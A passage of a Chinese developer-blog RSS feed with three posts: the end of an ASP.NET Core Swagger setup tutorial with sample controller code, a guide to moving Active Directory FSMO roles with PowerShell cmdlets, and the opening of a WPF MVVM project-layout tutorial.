                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; xmlPath = Path.Combine(basePath, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WebApplication2.xml&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                c.IncludeXmlComments(xmlPath);
            });
            services.AddMvcCore().AddApiExplorer();
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This method gets called by the runtime. Use this method to configure the HTTP request pipeline.&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (env.IsDevelopment())
            {
                app.UseDeveloperExceptionPage();
            }

            app.UseMvcWithDefaultRoute();
            app.UseSwagger(c &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
            });
            app.UseSwaggerUI(c &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
                c.ShowExtensions();
                c.ValidatorUrl(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
                c.SwaggerEndpoint(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/swagger/v1/swagger.json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;test V1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            });
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　以上部分为加载swagger的代码，位于startup.cs中，下面是controller代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Collections.Generic;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Linq;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Threading.Tasks;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.AspNetCore.Mvc;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; WebApplication2.Controllers
{
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 测试信息
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    [Route(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;api/[controller]/[action]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ValuesController : Controller
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 获取所有信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
&lt;span&gt;        [HttpGet]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IEnumerable&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt; Get()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;[] { &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;value1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;value2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; };
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 根据ID获取信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;id&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; GET api/values/5&lt;/span&gt;
        [HttpGet(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Get(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; POST了一个数据信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;value&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; POST api/values&lt;/span&gt;
&lt;span&gt;        [HttpPost]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Post([FromBody]&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value)
        {
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 根据ID put 数据
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;id&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;value&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; PUT api/values/5&lt;/span&gt;
        [HttpPut(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Put(&lt;span&gt;int&lt;/span&gt; id, [FromBody]&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value)
        {
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 根据ID删除数据
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;id&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; DELETE api/values/5&lt;/span&gt;
        [HttpDelete(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Delete(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id)
        {
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 复杂数据操作
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;id&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; DELETE api/values/5&lt;/span&gt;
&lt;span&gt;        [HttpPost]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; namevalue test(namevalue _info)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; _info;
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; namevalue
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; name的信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; String name { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; value的信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; String value { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　接下来我们还需要在生成中勾上XML生成文档，如图所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/465472/201802/465472-20180222203108082-1289478738.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　接下去我们可以运行起来了，调试，浏览器中输入http://localhost:50510/swagger/，这里端口啥的根据实际情况来，运行效果如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/465472/201802/465472-20180222203310229-1864588700.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到swagger将方法上的注释以及实体的注释都抓出来了，并且显示在swaggerui，整体一目了然，并且可以通过try it按钮进行简单的调试，但是在具体项目中，可能存在需要将某些客户端信息通过header带到服务中，例如token信息，用户信息等（我们项目中就需要header中带上token传递到后端），那针对于这种情况要如何实现呢？可以看下面的做法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This method gets called by the runtime. Use this method to add services to the container.&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ConfigureServices(IServiceCollection services)
        {
            services.AddMvc();
            services.AddSwaggerGen(c &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
                c.SwaggerDoc(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; Info { Title = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, Version = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; });
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; basePath =&lt;span&gt; PlatformServices.Default.Application.ApplicationBasePath;
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; xmlPath = Path.Combine(basePath, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WebApplication2.xml&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                c.IncludeXmlComments(xmlPath);
               &lt;strong&gt; c.OperationFilter&lt;/strong&gt;&lt;/span&gt;&lt;strong&gt;&amp;lt;AddAuthTokenHeaderParameter&amp;gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;();&lt;/strong&gt;
            });
            services.AddMvcCore().AddApiExplorer();
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AddAuthTokenHeaderParameter : IOperationFilter
    {

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Apply(Operation operation, OperationFilterContext context)
        {

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (operation.Parameters == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                operation.Parameters &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; List&amp;lt;IParameter&amp;gt;&lt;span&gt;();
            }
            operation.Parameters.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; NonBodyParameter()
            {
                Name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;token&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                In &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;header&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                Type &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                Description &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;token认证信息&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                Required &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;
            });
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们在ConfigureServices添加了OperationFilter&amp;lt;AddAuthTokenHeaderParameter&amp;gt;()，通过这种方式我们可以在swagger中显示token的header，并且进行调试（如图所示），AddAuthTokenHeaderParameter 的apply的属性context中带了controller以及action的各种信息，可以配合实际情况使用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/465472/201802/465472-20180222204526881-1398903459.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;strong&gt;四、与其他API管理工具结合&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　swagger强大的功能以及社区的力量，目前很多的API管理工具都支持YApi，目前我们使用的是由去哪儿开源的&lt;a href=&quot;http://yapi.demo.qunar.com/&quot; target=&quot;_blank&quot;&gt;YApi&lt;/a&gt;，从图中可以看到YApi支持导入swagger生成的JSON文件，除该工具 之外&lt;a href=&quot;http://www.doclever.cn/controller/index/index.html&quot; target=&quot;_blank&quot;&gt;DOClever&lt;/a&gt;（开源）也是一个不错的API管理工具，也支持Swagger文件导入（具体工具用法，大家可以去看他们的官网）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/465472/201802/465472-20180222205100413-1436857553.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;五、总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;Swagger是一个很好的工具，并且在前后端分离开发越来越流行的情况下，在后续的开发过程中，我觉得会扮演着越来越重要的作用，目前我们公司小的项目已经准备开始使用swagger+yapi进行API的管理方式，而这篇文章也是这段时间抽空整理API管理的结果，希望可以帮助到大家，这里可能有很多不足的地方，欢迎大家拍砖，也希望可以跟大家一起进步&lt;/p&gt;

&lt;p&gt;　　&lt;a href=&quot;http://p0myjvpgf.bkt.clouddn.com/WebApplication2.zip&quot; target=&quot;_blank&quot;&gt;demo地址 &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者： Mango&lt;/p&gt;
&lt;p&gt;出处： &lt;a href=&quot;http://www.cnblogs.com/OMango/&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/OMango/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;关于自己：专注.Net桌面开发以及Web后台开发，开始接触微服务、docker等互联网相关&lt;/p&gt;
&lt;p&gt;本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出, &lt;a href=&quot;http://www.cnblogs.com/OMango/p/8460092.html&quot;&gt;原文链接&lt;/a&gt; 如有问题， 可邮件（hongjb@yizit.com）咨询.&lt;/p&gt;



</description>
<pubDate>Thu, 22 Feb 2018 13:00:00 +0000</pubDate>
<dc:creator>OMango</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/OMango/p/8460092.html</dc:identifier>
</item>
<item>
<title>Windows Server 2016-Powershell迁移FSMO角色 - Wenzhongxiang</title>
<link>http://www.cnblogs.com/wenzhongxiang/p/8459926.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wenzhongxiang/p/8459926.html</guid>
<description>&lt;p&gt;上一章节我们讲到了通过Ntdsutil命令行进行FSMO角色迁移，本章开始之前我们先讨论一下有关FSMO角色放置建议：&lt;/p&gt;
&lt;ul class=&quot; list-paddingleft-2&quot; readability=&quot;3&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;建议将架构主机角色(Schema Master)和域命名主机角色(Domain Naming Master)放在森林根域的GC(全局编录)服务器上；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;建议将架构主机角色(Schema Master)和域命名主机角色(Domain Naming Master)放在第一台域控制器上；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;默认Domain Naming Master角色的域控制器必须同时也是GC(全局编录)服务器；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;不建议将Infrastructure Master和GC放在同一台域控制器上；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;一般不建议把PDC Emulator、RID Master及Infrastructure Master放置在GC服务器上;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;但那很多情况下管理员的一般针对单域林的操作方法是基础结构主机可以部署在域中的任意域控制器上，而不管域控制器是否承载了全局编录；针对多域林，如果位于多域林中的指定域没有任何域控制器承载全局编录，则基础结构主机必须部署在一个没有承载全局编录的域控制器上。&lt;/p&gt;
&lt;p&gt;本章我们将介绍通过Powershell进行FSMO角色迁移的方法(记得以管理员身份运行Powershell,如果没有执行权限，记得Set-ExecutionPolicy Unrestricted调整执行权限)，希望以下内容可以帮到大家。&lt;/p&gt;
&lt;p&gt;1、查看当前FSMO角色信息：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
查看林范围操作主机角色：&lt;br/&gt;Get-ADForest azureyun.local |ft SchemaMaster,DomainNamingMaster&lt;br/&gt;查看域范围操作主机角色：&lt;br/&gt;Get-ADDomain azureyun.local |ft InfrastructureMaster,Pdcemulator,RidMaster
&lt;/pre&gt;
&lt;p&gt;2、执行域命名主机角色（Domain Naming Master）、RID 主机角色（RID Master）和基础架构主机角色（Infrastructure Master）迁移，根据提示回车确认：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Move-ADDirectoryServerOperationMasterRole -Identity Bdc -OperationMasterRole DomainNamingMaster,InfrastructureMaster,RIDMaster -force
&lt;/pre&gt;
&lt;p&gt;3、通过Powershell分别查看林范围跟域范围操作主机角色，确认迁移操作是否成功：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Get-ADForest azureyun.local |ft SchemaMaster,DomainNamingMaster&lt;br/&gt;Get-ADDomain azureyun.local |ft InfrastructureMaster,Pdcemulator,RidMaster
&lt;/pre&gt;
&lt;p&gt;4、执行架构主机角色（Schema Master）、PDC 模拟主机角色（PDC Emulator）角色迁移，根据提示回车确认：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Move-ADDirectoryServerOperationMasterRole -Identity Bdc -OperationMasterRole SchemaMaster,PDCEmulator -Force
&lt;/pre&gt;
&lt;p&gt;5、此时我们通过Powershell分别查看林范围跟域范围操作主机角色，发现迁移均已成功：&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Get-ADForest azureyun.local |ft SchemaMaster,DomainNamingMaster&lt;br/&gt;Get-ADDomain azureyun.local |ft InfrastructureMaster,Pdcemulator,RidMaster
&lt;/pre&gt;
&lt;p&gt;附操作实例图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.azureyun.com/wp-content/uploads/2018/02/022218_1126_WindowsServ1.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;附快速操作流程：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A、查看当前域控制器名称，并确认当前林范围跟域范围操作主机角色信息：&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.azureyun.com/wp-content/uploads/2018/02/022218_1126_WindowsServ2.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B、执行Powershell命令对五个角色进行一次性迁移操作：&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
Move-ADDirectoryServerOperationMasterRole -Identity Major -OperationMasterRole SchemaMaster,DomainNamingMaster,PDCEmulator,InfrastructureMaster,RIDMaster -force&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;SchemaMaster&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗?&lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;DomainNamingMaster&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗?&lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;PDCEmulator&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗? &lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;InfrastructureMaster&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗? &lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;移动操作主机角色&lt;br/&gt;你要将角色&quot;RIDMaster&quot;移动到服务器&quot;Major.azureyun.local&quot;中吗? &lt;br/&gt;[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为&quot;Y&quot;):&lt;br/&gt;PS C:\&amp;gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://www.azureyun.com/wp-content/uploads/2018/02/022218_1126_WindowsServ3.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C、查看当前FSMO角色信息，发现已经迁移成功。&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;brush:ps;toolbar:false&quot;&gt;
PS C:\&amp;gt; Get-ADForest azureyun.local |ft SchemaMaster,DomainNamingMaster&lt;br/&gt;SchemaMaster DomainNamingMaster&lt;br/&gt;------------ ------------------&lt;br/&gt;Major.azureyun.local Major.azureyun.local&lt;br/&gt;PS C:\&amp;gt; Get-ADDomain azureyun.local |ft InfrastructureMaster,Pdcemulator,RidMaster&lt;br/&gt;InfrastructureMaster Pdcemulator RidMaster&lt;br/&gt;-------------------- ----------- ---------&lt;br/&gt;Major.azureyun.local Major.azureyun.local Major.azureyun.local
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://www.azureyun.com/wp-content/uploads/2018/02/022218_1126_WindowsServ4.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过图形化、Ntdsutil命令行及Powershell命令三种方法进行FSMO角色迁移，我们发现还是通过Powershell进行迁移操作更简单更快捷，希望可以帮到大家。&lt;/p&gt;

</description>
<pubDate>Thu, 22 Feb 2018 11:44:00 +0000</pubDate>
<dc:creator>Wenzhongxiang</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wenzhongxiang/p/8459926.html</dc:identifier>
</item>
<item>
<title>WPF项目学习.一 - 叶耶①</title>
<link>http://www.cnblogs.com/yjwlogs/p/8459751.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yjwlogs/p/8459751.html</guid>
<description>&lt;p&gt;&lt;span&gt;版权声明：本文为博主初学经验，未经博主允许不得转载。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一、前言&lt;/p&gt;
&lt;p&gt; 　　记录在学习与制作WPF过程中遇到的解决方案。&lt;/p&gt;
&lt;p&gt;　　 使用MVVM的优点是 数据和视图分离，双向绑定，低耦合，可重用行，相对独立的设计和逻辑；&lt;/p&gt;

&lt;p&gt;二、配置&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;code&gt;系统环境：&lt;/code&gt;&lt;code&gt;win10&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;开发工具：&lt;/code&gt;&lt;code&gt;Visual Studio 2017&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;开发语言：&lt;/code&gt;&lt;code&gt;C#.WPF (MVVM框架)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;数据库：&lt;/code&gt;&lt;code&gt;SQLiteStudio&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;三、附件&lt;/p&gt;
&lt;p&gt;四、步骤&lt;/p&gt;
&lt;p&gt;　　1. 创建项目；&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222151927043-1107087308.gif&quot; alt=&quot;&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　2. 文件夹层级；&lt;/p&gt;
&lt;p&gt;　　　　建文件夹：Model，ViewModel，View，Resources，Lib，Service，Common；&lt;/p&gt;
&lt;p&gt;　　　　Model是模型层，属性类存放的地方；也就是存放不涉及业务逻辑的代码；&lt;/p&gt;
&lt;p&gt;　　　　　　例如：列表元素，接口参数，枚举，数据交互的参数模型和View基础元素属性等等；&lt;/p&gt;
&lt;p&gt;　　　　ViewMode是视图模型层，是MVVM实现业务逻辑代码的地方；&lt;/p&gt;
&lt;p&gt;　　　　　　例如：操作视图界面数据的呈现，界面按钮触发的事件和操作数据库前后对界面交互的事件；&lt;/p&gt;
&lt;p&gt;　　　　View是视图层，是窗体布局实现的地方；也就是呈现给用户交互使用的界面窗体；&lt;/p&gt;
&lt;p&gt;　　　　　　例如：登录页面，查询页面，新增和编辑的页面等；&lt;/p&gt;
&lt;p&gt;　　　　Resources是资源库层，里面存放声音，图片和样式布局等统一调用外部资源的地方；&lt;/p&gt;
&lt;p&gt;　　　　Lib是引用层，放置一些第三方引用便于调用，也可以用nuget统一管理第三方dll；&lt;/p&gt;
&lt;p&gt;　　　　Service是服务层，是实现对数据库或者对站点接口的操作，进行数据持久化和数据交互；&lt;/p&gt;
&lt;p&gt;　　　　Common是工具层，是存放一些公共的代码，统一调用，简洁业务逻辑代码的冗余；&lt;/p&gt;
&lt;p&gt;　　　　注：可以建文件夹，但更推荐新建类库放置以上层级；&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222152442267-764166493.gif&quot; alt=&quot;&quot; width=&quot;500&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　3. 控件的使用与布局；&lt;/p&gt;
&lt;p&gt;　　　　3.1 从工具箱中直接拖拉控件；&lt;/p&gt;
